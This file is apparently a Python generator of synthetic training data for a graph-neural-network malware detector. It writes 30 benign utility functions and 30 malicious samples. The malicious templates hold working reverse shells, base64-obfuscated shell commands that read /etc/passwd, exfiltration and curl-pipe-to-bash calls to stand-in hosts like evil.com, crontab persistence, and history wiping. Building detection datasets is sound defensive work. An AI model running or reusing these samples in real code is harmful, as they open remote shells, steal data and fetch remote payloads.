"""
generate_dataset.py — Generate 60 synthetic Python files for GNN training.
Produces 30 benign and 30 malicious files in dataset/.
"""

from pathlib import Path

NUM = 30
out = Path("dataset")
bdir = out / "benign"
mdir = out / "malicious"
bdir.mkdir(parents=True, exist_ok=True)
mdir.mkdir(parents=True, exist_ok=True)

def make_benign(i):
    name = f"benign_{i:03d}"
    templates = [
        f'def {name}(a: int, b: int) -> int:\n    return a + b',
        f'def {name}(n: int) -> int:\n    total = 0\n    for i in range(n):\n        total += i\n    return total',
        f'def {name}(a: float, b: float) -> float:\n    if b == 0:\n        raise ValueError("zero")\n    return a / b',
        f'def {name}(items: list) -> int:\n    return len([x for x in items if x > 0])',
        f'def {name}(n: int) -> int:\n    a, b = 0, 1\n    for _ in range(n):\n        a, b = b, a + b\n    return a',
        f'def {name}(text: str) -> str:\n    return text.strip().lower()',
        f'def {name}(text: str) -> str:\n    return " ".join(text.split()[::-1])',
        f'def {name}(text: str, old: str, new: str) -> str:\n    return text.replace(old, new)',
        f'def {name}(text: str) -> bool:\n    return text == text[::-1]',
        f'def {name}(text: str) -> dict:\n    counts = {{}}\n    for ch in text:\n        counts[ch] = counts.get(ch, 0) + 1\n    return counts',
        f'def {name}(filepath: str) -> str:\n    with open(filepath) as f:\n        return f.read()',
        f'def {name}(filepath: str, data: str) -> None:\n    with open(filepath, "w") as f:\n        f.write(data)',
        f'def {name}(filepath: str) -> list:\n    with open(filepath) as f:\n        return [line.strip() for line in f]',
        f'def {name}(filepath: str) -> bool:\n    import os\n    return os.path.exists(filepath)',
        f'def {name}(directory: str) -> list:\n    import os\n    return os.listdir(directory)',
        f'def {name}(data: list) -> dict:\n    result = {{}}\n    for item in data:\n        k = str(item)\n        result[k] = result.get(k, 0) + 1\n    return result',
        f'def {name}(data: list) -> list:\n    seen = set()\n    return [x for x in data if not (x in seen or seen.add(x))]',
        f'def {name}(data: list, t: float) -> list:\n    return [x for x in data if x > t]',
        f'def {name}(rows: list) -> list:\n    return sorted(rows, key=lambda r: r.get("id", 0))',
        f'def {name}(m: list) -> list:\n    return [[row[i] for row in m] for i in range(len(m[0]))]',
        f'def {name}(text: str) -> bool:\n    return text.isdigit()',
        f'def {name}(text: str) -> bool:\n    import re\n    return bool(re.match(r"^[\\w.-]+@[\\w.-]+\\.\\w+$", text))',
        f'def {name}(data: dict, key: str) -> str:\n    return str(data[key])',
        f'def {name}(text: str, n: int) -> str:\n    return text[:n]',
        f'def {name}(v: str) -> int:\n    try:\n        return int(v)\n    except ValueError:\n        return 0',
        f'def {name}(items: list, key: str) -> dict:\n    result = {{}}\n    for item in items:\n        k = item.get(key, "other")\n        result.setdefault(k, []).append(item)\n    return result',
        f'def {name}(text: str, w: int) -> list:\n    return [text[i:i+w] for i in range(0, len(text), w)]',
        f'def {name}(a: dict, b: dict) -> dict:\n    r = {{}}\n    r.update(a)\n    r.update(b)\n    return r',
        f'import datetime\ndef {name}(n: int) -> str:\n    return datetime.datetime.now().strftime("Y-m-d")',
        f'import hashlib\ndef {name}(text: str) -> str:\n    return hashlib.md5(text.encode()).hexdigest()',
    ]
    tpl = templates[i % len(templates)]
    return f'"""Benign module: {name}"""\n{tpl}\nif __name__ == "__main__":\n    pass\n'

def make_malicious(i):
    name = f"malicious_{i:03d}"
    templates = [
        f'import os, base64\ndef {name}():\n    encoded = base64.b64encode(b"cat /etc/passwd").decode()\n    os.system(base64.b64decode(encoded).decode())',
        f'import os, base64\ndef {name}():\n    cmd = base64.b64encode(b"whoami").decode()\n    os.system(base64.b64decode(cmd).decode())',
        f'import os, base64\ndef {name}():\n    payload = base64.b64encode(b"id").decode()\n    os.system(base64.b64decode(payload).decode())',
        f'import os, base64\ndef {name}():\n    data = base64.b64encode(b"ls -la").decode()\n    os.system(base64.b64decode(data).decode())',
        f'import os, base64\ndef {name}():\n    enc = base64.b64encode(b"uname -a").decode()\n    os.system(base64.b64decode(enc).decode())',
        f'import subprocess, base64\ndef {name}():\n    cmd = base64.b64encode(b"cat /etc/hosts").decode()\n    subprocess.call(base64.b64decode(cmd).decode(), shell=True)',
        f'import subprocess, base64\ndef {name}():\n    payload = base64.b64encode(b"whoami").decode()\n    subprocess.run(base64.b64decode(payload).decode(), shell=True)',
        f'import subprocess, base64\ndef {name}():\n    data = base64.b64encode(b"ls /tmp").decode()\n    subprocess.Popen(base64.b64decode(data).decode(), shell=True)',
        f'import subprocess, base64\ndef {name}():\n    cmd = base64.b64encode(b"ps aux").decode()\n    subprocess.check_output(base64.b64decode(cmd).decode(), shell=True)',
        f'import subprocess, base64\ndef {name}():\n    enc = base64.b64encode(b"netstat -tlnp").decode()\n    subprocess.call(base64.b64decode(enc).decode(), shell=True)',
        f'import socket, subprocess, os\ndef {name}():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(("10.0.0.1", 4444))\n    os.dup2(s.fileno(), 0)\n    os.dup2(s.fileno(), 1)\n    os.dup2(s.fileno(), 2)\n    subprocess.call(["/bin/sh", "-i"])',
        f'import socket, os, subprocess\ndef {name}():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(("192.168.1.100", 8080))\n    os.dup2(sock.fileno(), 0)\n    os.dup2(sock.fileno(), 1)\n    os.dup2(sock.fileno(), 2)\n    subprocess.call(["/bin/bash", "-i"])',
        f'import socket, subprocess, os\ndef {name}():\n    s = socket.socket()\n    s.connect(("10.0.0.1", 9999))\n    os.dup2(s.fileno(), 0)\n    os.dup2(s.fileno(), 1)\n    os.dup2(s.fileno(), 2)\n    subprocess.Popen(["/bin/sh", "-i"])',
        f'import socket, os, subprocess\ndef {name}():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(("10.0.0.1", 4444))\n    os.dup2(sock.fileno(), 0)\n    os.dup2(sock.fileno(), 1)\n    os.dup2(sock.fileno(), 2)\n    subprocess.call("/bin/sh -i", shell=True)',
        f'import socket, subprocess, os\ndef {name}():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(("172.16.0.1", 5555))\n    os.dup2(s.fileno(), 0)\n    os.dup2(s.fileno(), 1)\n    os.dup2(s.fileno(), 2)\n    subprocess.call(["/bin/sh", "-i"])',
        f'import urllib.request, base64\ndef {name}():\n    data = base64.b64encode(b"sensitive_data").decode()\n    urllib.request.urlopen("https://evil.example.com/collect?d=" + data)',
        f'import urllib.request, base64\ndef {name}():\n    payload = base64.b64encode(b"secret_key=abc123").decode()\n    req = urllib.request.Request("https://attacker.com/ex", data=payload.encode())\n    urllib.request.urlopen(req)',
        f'import urllib.request, base64\ndef {name}():\n    stolen = base64.b64encode(b"credentials").decode()\n    urllib.request.urlopen("https://evil.com/log?data=" + stolen, timeout=5)',
        f'import urllib.request, base64\ndef {name}():\n    data = base64.b64encode(b"api_key=xyz").decode()\n    req = urllib.request.Request("https://evil.example.com/collect", data=data.encode())\n    urllib.request.urlopen(req)',
        f'import urllib.request, base64\ndef {name}():\n    payload = base64.b64encode(b"database_password").decode()\n    urllib.request.urlopen("https://evil.com/steal?p=" + payload)',
        f'import os, base64\ndef {name}():\n    cron = base64.b64encode(b"* * * * * curl https://evil.com/p").decode()\n    os.system("(crontab -l; echo \\"" + base64.b64decode(cron).decode() + "\\") | crontab -")',
        f'import os, base64\ndef {name}():\n    entry = base64.b64encode(b"@reboot /tmp/.hidden").decode()\n    os.system("echo \\"" + base64.b64decode(entry).decode() + "\\" >> /tmp/.cron")',
        f'import os, base64\ndef {name}():\n    payload = base64.b64encode(b"curl -s https://evil.com/b.sh | bash").decode()\n    os.system(base64.b64decode(payload).decode())',
        f'import os, base64\ndef {name}():\n    script = base64.b64encode(b"wget https://evil.com/payload -O /tmp/x").decode()\n    os.system(base64.b64decode(script).decode())',
        f'import os, base64\ndef {name}():\n    cmd = base64.b64encode(b"echo \'* * * * * /tmp/.x\' | crontab -").decode()\n    os.system(base64.b64decode(cmd).decode())',
        f'import os, base64, subprocess\ndef {name}():\n    s1 = base64.b64encode(b"curl https://evil.com/s.sh").decode()\n    s2 = base64.b64encode(b"bash /tmp/s.sh").decode()\n    os.system(base64.b64decode(s1).decode())\n    subprocess.call(base64.b64decode(s2).decode(), shell=True)',
        f'import os, base64, urllib.request\ndef {name}():\n    url = base64.b64encode(b"https://evil.com/payload").decode()\n    os.system("curl -s " + base64.b64decode(url).decode() + " | bash")',
        f'import os, base64, subprocess\ndef {name}():\n    enc = base64.b64encode(b"rm -rf /tmp/* && curl https://evil.com/next").decode()\n    os.system(base64.b64decode(enc).decode())',
        f'import os, base64, socket\ndef {name}():\n    t = base64.b64encode(b"10.0.0.1:4444").decode()\n    h, p = base64.b64decode(t).decode().split(":")\n    s = socket.socket()\n    s.connect((h, int(p)))\n    os.dup2(s.fileno(), 0)\n    os.dup2(s.fileno(), 1)\n    os.system("/bin/sh")',
        f'import os, base64, subprocess, urllib.request\ndef {name}():\n    data = base64.b64encode(b"stolen_files").decode()\n    urllib.request.urlopen("https://evil.com/ex?d=" + data)\n    cmd = base64.b64encode(b"history -c").decode()\n    subprocess.call(base64.b64decode(cmd).decode(), shell=True)',
    ]
    tpl = templates[i % len(templates)]
    return f'"""Malicious module: {name}"""\n{tpl}\nif __name__ == "__main__":\n    {name}()\n'

if __name__ == "__main__":
    for i in range(NUM):
        (bdir / f"benign_{i:03d}.py").write_text(make_benign(i))
        (mdir / f"malicious_{i:03d}.py").write_text(make_malicious(i))
    print(f"Generated: {len(list(bdir.glob('*.py')))} benign, {len(list(mdir.glob('*.py')))} malicious")
